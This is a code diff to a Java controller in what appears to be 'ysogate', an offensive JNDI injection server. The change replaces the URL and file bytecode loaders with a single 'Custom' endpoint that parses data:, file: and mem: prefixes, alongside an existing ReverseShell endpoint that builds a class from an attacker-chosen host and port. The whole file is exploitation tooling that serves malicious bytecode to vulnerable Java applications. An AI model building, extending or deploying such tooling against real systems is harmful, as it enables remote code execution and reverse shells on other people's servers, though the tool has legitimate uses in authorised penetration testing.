@@ -13,9 +13,13 @@ import com.h2tg.ysogate.utils.CtClassUtils;
 
 import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
+import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import java.util.Arrays;
 import java.util.Base64;
+
+import static com.h2tg.ysogate.utils.MiscUtils.tryBase64UrlDecode;
 
 @JNDIController
 @JNDIMapping("/Basic")
@@ -81,19 +85,21 @@ public class BasicController implements Controller {
         return clazz.toBytecode();
     }
 
-    @JNDIMapping("/FromUrl/{data}")
-    public byte[] fromUrl(String data) {
-        System.out.println("[Code] Load custom bytecode data from url");
-        byte[] byteCode = Base64.getUrlDecoder().decode(data);
+    @JNDIMapping("/Custom/{data}")
+    public byte[] custom(String data) throws IOException
+    {
+        System.out.println("[Code] Load custom bytecode data");
+        byte[] byteCode;
+        try {
+            byteCode = parseData(data);
+        } catch (Exception e) {
+            System.out.println("[Error] Failed to parse data");
+            return null;
+        }
+
         return byteCode;
     }
 
-    @JNDIMapping("/FromFile/{path}")
-    public byte[] fromFile(String path) throws Exception {
-        System.out.println("[Path] Load custom bytecode data from file: " + path);
-        byte[] byteCode = Files.readAllBytes(Paths.get(path));
-        return byteCode;
-    }
 
     @JNDIMapping("/ReverseShell/{host}/{port}")
     public byte[] reverseShell(String host, String port) throws Exception {
@@ -108,5 +114,22 @@ public class BasicController implements Controller {
         CtClassUtils.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
 
         return clazz.toBytecode();
+    }
+
+    private byte[] parseData(String data) throws IOException {
+        String prefix = data.substring(0, data.indexOf(":"));
+        String baseStr = data.substring(data.indexOf(":") + 1);
+        if (prefix.equals("data")) {
+            return Base64.getUrlDecoder().decode(baseStr);
+        } else if (prefix.equals("file")) {
+            String path = tryBase64UrlDecode(baseStr);
+            return Files.readAllBytes(Paths.get(path));
+        } else if (prefix.equals("mem")) {
+            return null;
+        }
+        else {
+            System.out.println("[Error] Unknown prefix: " + prefix);
+            return null;
+        }
     }
 }
